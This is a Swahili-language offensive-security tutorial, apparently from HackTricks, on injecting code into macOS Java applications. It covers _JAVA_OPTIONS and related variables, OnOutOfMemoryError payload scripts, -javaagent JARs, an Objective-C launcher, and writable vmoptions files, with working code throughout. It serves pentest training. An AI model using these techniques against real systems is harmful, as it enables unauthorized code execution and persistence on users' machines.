# Injection ya Java Applications kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## Uhesabuji

Tafuta Java applications zilizosakinishwa kwenye mfumo wako. Ilibainika kuwa Java apps zilizo kwenye **Info.plist** zitakuwa na baadhi ya Java parameters zilizo na string **`java.`**, hivyo unaweza kuitafuta:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Kigezo cha mazingira **`_JAVA_OPTIONS`** kinaweza kutumika kuingiza Java VM parameters kiholela wakati Java application inapoanzishwa.<sup>[[1]](#references)</sup>

Java launch stack pia inatambua vigezo viwili vilivyoainishwa vizuri zaidi, vyenye scopes tofauti:

- `JAVA_TOOL_OPTIONS` husomwa wakati VM inaundwa, ikijumuisha baadhi ya embedded launch paths ambazo hazipiti kwenye `java` launcher. Kinaweza kuingiza instrumentation options kama vile `-javaagent`, `-agentlib`, au `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` huongezwa mwanzoni na `java` launcher kwenye command line yake. Options zinazochagua main class au kusitisha launcher haziruhusiwi, lakini `-javaagent` inakubaliwa.<sup>[[5]](#references)</sup>

Vigezo vyote vitatu vinapaswa kuchukuliwa kama JVM code-execution controls wakati attacker anaweza pia kutoa agent inayoweza kusomeka na inayooana. `_JAVA_OPTIONS` ni HotSpot implementation detail, kwa hiyo ithibitishe dhidi ya vendor na version halisi; `JAVA_TOOL_OPTIONS` au `JDK_JAVA_OPTIONS` zinapendelewa kwa portable testing.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Ili kuiendesha kama process mpya na si kama child wa terminal ya sasa, unaweza kutumia:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Hata hivyo, mbinu hiyo husababisha hitilafu katika application inayotekelezwa. Njia mbadala iliyo fiche zaidi ni kuunda Java agent na kutumia `-javaagent`:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> Kuunda agent kwa **toleo tofauti la Java** na la application kunaweza kusababisha agent na application ku-crash.

Agent inaweza kuwa:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Ili ku-compile agent endesha:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Kwa kutumia `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Kisha export variable ya env na uendeshe java application kama ifuatavyo:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## faili ya vmoptions

Faili hii inasaidia kubainisha **Java parameters** wakati Java inaendeshwa. Unaweza kutumia baadhi ya mbinu zilizotangulia kubadilisha Java parameters na **kuufanya mchakato utekeleze arbitrary commands**.\
Zaidi ya hayo, faili hii inaweza pia **kujumuisha faili nyingine** kwa kutumia directive ya `include`, hivyo unaweza pia kubadilisha faili iliyojumuishwa.

Zaidi bado, baadhi ya Java apps **hupakia zaidi ya faili moja ya `vmoptions`**.

Baadhi ya applications, kama vile Android Studio, huonyesha katika **output yao mahali zinapotafuta** faili hizi:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Ikiwa hawafanyi hivyo, unaweza kukiangalia kwa:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Kumbuka kwamba Android Studio katika mfano huu hujaribu kupakia **`/Applications/Android Studio.app.vmoptions`**, eneo ambalo mtumiaji yeyote katika **`admin` group ana ruhusa ya kuandika**.

## References

- [1] [OpenJDK — uchanganuzi wa `_JAVA_OPTIONS` katika `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — specification ya package ya `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — Kusanidi JVM options na platform properties](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [Kizindua cha `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
